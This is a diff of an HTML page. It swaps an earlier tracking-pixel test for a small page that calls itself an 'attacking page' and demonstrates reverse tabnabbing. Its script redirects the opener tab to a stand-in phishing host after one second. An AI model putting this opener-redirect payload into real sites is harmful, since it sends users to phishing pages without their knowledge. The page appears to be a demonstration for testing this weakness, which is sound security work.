@@ -1,29 +1,21 @@
-
-
-<!doctype html>
-<html lang="en">
-<head>
-    <script>
-        alert(window.opener);
-//         (function() {
-//             var ta = document.createElement('script'); ta.async = true;
-//             ta.src = "https://api.imotech.video/ad/events.js?pixel_id=903215497283147264";
-//             var s = document.getElementsByTagName('script')[0];
-//             s.parentNode.insertBefore(ta, s);
-//         })();
-        
-//         window.bgdataLayer = window.bgdataLayer || [];
-//         function bge(){bgdataLayer.push(arguments);}
-//         bge('init', "903215497283147264");
-//         bge('event', 'ec_detail_view');
-    </script>
-    <script src="http://127.0.0.1:8000/pixels/852pco0dl1l1/lead/pixels.js" async></script>
-    
-</head>
-<body>
-    <div style="width: 500px; height: 100px; background-color: bisque;">Hello</div>
-</body>
+<!DOCTYPE html>
+<html>
 <script>
-    alert(window.opener);
+    setTimeout(() => {
+        if (window.opener) {
+            // Меняем URL opener
+            window.opener.location.href = 'https://evil-phishing-site.example.com';
+            
+            // Или показываем подтверждение
+            const confirmed = confirm('Выполнить атаку?');
+            if (confirmed) {
+                window.opener.location.href = 'https://evil-phishing-site.example.com';
+            }
+        }
+    }, 1000);
 </script>
+<body>
+    <h2>Атакующая страница</h2>
+    <p>Эта страница пытается изменить исходную вкладку.</p>
+</body>
 </html>
